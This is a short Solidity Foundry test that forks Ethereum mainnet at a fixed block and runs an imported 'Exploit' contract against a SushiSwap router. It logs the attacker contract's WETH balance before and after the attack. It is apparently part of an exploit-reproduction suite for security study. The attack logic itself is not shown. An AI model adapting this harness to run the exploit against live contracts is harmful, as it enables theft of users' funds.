// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "../SushiRouterExploit.sol";


contract ContractTest is Test{
    Exploit exp;
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    function setUp() public {
        vm.createSelectFork("mainnet", 17007841);
    }

    function test_sushiRouter() public {
        exp = new Exploit();
        address exp_addr = computeCreateAddress(address(exp), 1);
        console.log("WETH balance before attack: ", WETH.balanceOf(exp_addr));
        exp.exploit();
        console.log("WETH balance after attack:", WETH.balanceOf(address(exp_addr)));
    }
}